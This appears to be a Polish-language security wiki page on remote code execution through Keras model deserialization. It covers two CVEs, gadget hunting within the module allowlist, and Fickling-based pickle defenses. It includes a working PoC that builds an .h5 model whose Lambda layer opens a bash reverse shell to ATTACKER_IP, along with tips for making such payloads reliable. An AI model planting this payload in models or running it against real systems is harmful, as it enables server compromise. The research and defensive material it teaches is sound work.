# RCE podczas deserializacji modelu Keras i wyszukiwanie gadgetów

{{#include ../../banners/hacktricks-training.md}}

Ta strona podsumowuje praktyczne techniki exploitacji pipeline'u deserializacji modeli Keras, wyjaśnia wewnętrzne działanie natywnego formatu .keras i jego attack surface oraz przedstawia toolkit dla researcherów służący do znajdowania Model File Vulnerabilities (MFV) i gadgetów działających po wprowadzeniu poprawek.

## Wewnętrzne działanie formatu modelu .keras

Plik .keras to archiwum ZIP zawierające co najmniej:<sup>[[1]](#references)</sup>
- metadata.json – ogólne informacje (np. wersja Keras)
- config.json – architektura modelu (główny attack surface)
- model.weights.h5 – wagi w formacie HDF5

config.json steruje rekurencyjną deserializacją: Keras importuje moduły, rozwiązuje klasy/funkcje i odtwarza warstwy/obiekty ze słowników kontrolowanych przez attackera.<sup>[[1]](#references)</sup>

Przykładowy fragment obiektu warstwy Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization wykonuje:<sup>[[1]](#references)</sup>
- Importowanie modułu i rozwiązywanie symboli na podstawie kluczy module/class_name
- Wywołanie from_config(...) lub konstruktora z kontrolowanymi przez atakującego kwargs
- Rekurencję do zagnieżdżonych obiektów (activations, initializers, constraints itd.)

Historycznie zapewniało to atakującemu tworzącemu config.json trzy prymitywy:<sup>[[1]](#references)</sup>
- Kontrolę nad tym, jakie moduły są importowane
- Kontrolę nad tym, które klasy/funkcje są rozwiązywane
- Kontrolę nad kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Główna przyczyna:
- Legacy Lambda deserialization odtwarzała funkcję Python z kontrolowanego przez atakującego kodu marshaled: `func_load()` dekoduje payload z base64, wywołuje `marshal.loads()` i tworzy `FunctionType`. Bytecode wynikowej funkcji jest wykonywany po wywołaniu Lambda, a loadery sprzed wersji 2.13 nie wymuszały kontroli safe-mode dla legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

W natywnym archiwum Keras v3 funkcja Lambda jest reprezentowana jako obiekt `__lambda__`, którego pole `code` zawiera zakodowany w base64 kod marshaled:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Łagodzenie:
- Keras wymusza domyślnie `safe_mode=True` dla natywnego formatu Keras v3. Zserializowane lambdy Python w `Lambda` są blokowane, chyba że użytkownik jawnie wyłączy tę ochronę za pomocą `safe_mode=False`; ta ochrona nie obejmuje starszych formatów w taki sam sposób.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Uwagi:
- Starsze formaty (starsze zapisy HDF5) lub starsze codebase’y mogą nie wymuszać nowoczesnych kontroli, dlatego ataki typu „downgrade” nadal mogą działać, gdy ofiary używają starszych loaderów.

## CVE-2025-1550 – Import dowolnego modułu w Keras 3.0.0–3.8.x

Główna przyczyna:
- `_retrieve_class_or_fn` używał `importlib.import_module(module)` na kontrolowanych przez atakującego ciągach modułów z `config.json`.
- Wpływ: Specjalnie przygotowane archiwum `.keras` mogło sprawić, że `Model.load_model()` zaimportuje wybrane przez atakującego moduły i funkcje Python, wywołując efekty uboczne podczas importu oraz przekazując kontrolowane przez atakującego argumenty, nawet przy `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Pomysł na exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Ulepszenia bezpieczeństwa (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: importy są ograniczone do oficjalnych modułów ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blokuje ładowanie niezabezpieczonych funkcji serializowanych przez Lambda
- Podstawowe sprawdzanie typów: deserializowane obiekty muszą odpowiadać oczekiwanym typom

## Praktyczna eksploatacja: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Starsze wdrożenia TensorFlow-Keras mogą nadal akceptować pliki modeli HDF5 (`.h5`). Jeśli attacker może przesłać model, który serwer następnie załaduje lub wykorzysta do inferencji, podatny loader może deserializować warstwę Lambda zawierającą kontrolowany przez attackera kod Python, który może następnie wykonać się w ramach workflow modelu aplikacji.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimalny PoC do utworzenia złośliwego pliku .h5, którego Lambda wykona reverse shell, gdy target wywoła model:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Uwagi i wskazówki dotyczące niezawodności:
- Punkty wyzwalania różnią się w zależności od formatu i workflow; w przywołanym opracowaniu zaobserwowano dwukrotne wykonanie payloadu podczas predykcji. Traktuj efekty uboczne jako powtarzalne i twórz payloady idempotentne.<sup>[[7]](#references)</sup>
- Pinning wersji: dopasuj TF/Keras/Python do środowiska ofiary, aby uniknąć niezgodności serializacji. Na przykład twórz artefakty w Python 3.8 z TensorFlow 2.13.1, jeśli właśnie tego używa cel.<sup>[[7]](#references)</sup>
- Szybka replikacja środowiska:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Walidacja: nieszkodliwy payload, taki jak `os.system("ping -c 1 YOUR_IP")`, pomaga potwierdzić wykonanie (np. obserwując pakiety ICMP za pomocą tcpdump) przed przejściem do reverse shell.<sup>[[7]](#references)</sup>

## Powierzchnia gadgetów po poprawce wewnątrz allowlisty

Nawet przy allowliście modułów Keras i safe mode dozwolone callable mogą ujawniać efekty uboczne. Na przykład `keras.utils.get_file` pobiera URL i zapisuje go w skonfigurowanej lokalizacji cache, co czyni go kandydatem do analizy gadgetów.<sup>[[1]](#references)[[19]](#references)</sup>

Konfiguracja Lambda-kandydata (zweryfikuj sygnaturę wywołania w kontrolowanym teście):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Ważne ograniczenie:
- `Lambda.call()` zawsze przekazuje input modelu jako pierwszy argument pozycyjny, a skonfigurowane `arguments` jako argumenty nazwane. W przypadku `get_file` ta wartość pozycyjna wypełnia `fname`; niezgodność tensor/ścieżka może spowodować, że ten kandydat zakończy się niepowodzeniem przed jakimkolwiek pobieraniem, więc nie jest to gwarantowanie działający gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting dla modeli AI/ML (Fickling)

Wiele formatów modeli AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artefakty joblib/scikit-learn oraz inne natywne formaty Pythona) zawiera dane Python pickle. Opisana powyżej starsza ścieżka Keras Lambda używa zamiast tego marshaled function bytecode, więc stanowi odrębne ryzyko deserializacji. Opcodes pickle mogą wywoływać zachowanie kontrolowane przez atakującego podczas deserializacji, w tym tampering modelu lub RCE, a proste skanery mogą przeoczyć nowe albo niewymienione niebezpieczne importy.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Praktyczną obroną typu fail-closed jest podpięcie się do deserializera pickle Pythona i zezwalanie podczas unpicklingu wyłącznie na zweryfikowany zestaw nieszkodliwych importów związanych z ML. Fickling firmy Trail of Bits implementuje tę politykę i zawiera starannie opracowaną ML import allowlist utworzoną na podstawie tysięcy publicznych pickle z Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Model bezpieczeństwa dla „bezpiecznych” importów (intuicje wyprowadzone z badań i praktyki): importowane symbole używane przez pickle muszą jednocześnie:<sup>[[8]](#references)</sup>
- Nie wykonywać kodu ani nie powodować jego wykonania (bez skompilowanych/źródłowych obiektów kodu, uruchamiania poleceń powłoki, hooków itp.)
- Nie pobierać ani nie ustawiać dowolnych atrybutów lub elementów
- Nie importować ani nie uzyskiwać referencji do innych obiektów Pythona z pickle VM
- Nie uruchamiać żadnych wtórnych deserializerów (np. marshal, zagnieżdżonego pickle), nawet pośrednio

Włącz ochronę Ficklinga możliwie wcześnie podczas uruchamiania procesu, aby każde ładowanie pickle wykonywane przez frameworki (`torch.load`, `joblib.load` itd.) było sprawdzane:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Wskazówki operacyjne:
- W razie potrzeby możesz tymczasowo wyłączać i ponownie włączać hooks:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Jeśli znany jako bezpieczny model zostanie zablokowany, po przejrzeniu symboli rozszerz allowlist dla swojego środowiska:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling udostępnia również ogólne mechanizmy ochrony runtime, jeśli preferujesz bardziej granularną kontrolę:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() aby wymusić kontrole dla wszystkich pickle.load()
- with fickling.check_safety(): do wymuszania kontroli w określonym zakresie
- fickling.load(path) / fickling.is_likely_safe(path) do jednorazowych kontroli

- W miarę możliwości preferuj formaty modeli inne niż pickle (np. SafeTensors).<sup>[[15]](#references)</sup> Jeśli musisz akceptować pickle, uruchamiaj loadery z minimalnymi uprawnieniami, bez wychodzącego ruchu sieciowego, i wymuszaj allowlist.

Ta strategia oparta przede wszystkim na allowlist demonstracyjnie blokuje typowe ścieżki exploitów ML pickle, zachowując jednocześnie wysoką kompatybilność. W benchmarku ToB Fickling wykrył 100% syntetycznych złośliwych plików i zaakceptował około 99% czystych plików z najpopularniejszych repozytoriów Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Narzędzia badacza

1) Systematyczne wyszukiwanie gadgetów w dozwolonych modułach

Wylicz potencjalne wywoływalne obiekty w modułach keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym, które powodują skutki uboczne związane z plikami, siecią, procesami lub środowiskiem.<sup>[[1]](#references)</sup>

<details>
<summary>Wylicz potencjalnie niebezpieczne wywoływalne obiekty w modułach Keras znajdujących się na allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Bezpośrednie testowanie deserializacji (bez potrzeby używania archiwum .keras)

Przekazuj spreparowane słowniki bezpośrednio do deserializatorów Keras, aby poznać akceptowane parametry i obserwować efekty uboczne.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Probing across versions and formats

Keras istnieje w wielu codebase'ach/erach, z różnymi guardrails i formatami:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, przeznaczone do usunięcia)
- tf-keras: utrzymywane oddzielnie
- Multi-backend Keras 3 (official): wprowadzono natywny .keras

Powtórz testy w różnych codebase'ach i formatach (.keras vs legacy HDF5), aby wykryć regresje lub brakujące guardy.

## References

- [1] [Hunting Vulnerabilities in Keras Model Deserialization (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Dodano kontrole do serializacji](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE podczas deserializacji Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Dowolny import modułu w Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [raport huntr – dowolny import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [raport huntr – dowolny import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE do root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [blog Trail of Bits – nowy scanner plików pickle AI/ML Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Zabezpieczanie środowisk AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Korpus benchmarków skanowania pickle Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Wprowadzenie do ataków Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projekt SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Warstwy Lambda Keras 2 umożliwiają dowolne wstrzykiwanie kodu](https://kb.cert.org/vuls/id/253266)
- [17] [Kod źródłowy warstwy Keras Lambda (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Kod źródłowy narzędzi Python Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
